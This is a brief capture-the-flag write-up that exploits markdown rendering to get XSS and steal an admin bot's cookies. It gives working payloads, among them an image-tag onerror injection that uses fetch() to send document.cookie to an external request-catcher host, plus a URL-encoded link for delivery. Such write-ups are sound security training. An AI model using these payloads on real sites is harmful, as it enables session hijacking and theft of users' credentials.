# The challange's idea is to steal the admin's cookies via XSS

## To achieve XSS we will exploit the markdown rendering

Upon Inspecting a simple payload from **Hacktricks**

https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html

The first POC we can see is

``` ![Value in HTML](<https://www.example.com/image.png>)```

After workinng and seeing that "Value in HTML" in indeed reflected in HTML

After that let's try to achieve XSS

``` ![Value" onerror="alert()](https://www.example.com/image.png) loli))```

After that we can steal the Bot's cookies via fetch() and **document.cookie**

```![Uh" onerror="fetch('https://wh0am1.requestcatcher.com/loli'+document.cookie)](https://www.example.com/image.png) loli))```

Now to get the flag send the following URL to the **admin**

```http://web:3000/?markdown=%21%5BUh%22+onerror%3D%22fetch%28%27https%3A%2F%2Fwh0am1.requestcatcher.com%2Floli%27%2Bdocument.cookie%29%5D%28https%3A%2F%2Fwww.example.com%2Fimage.png%29+loli%29%29%0D%0A```

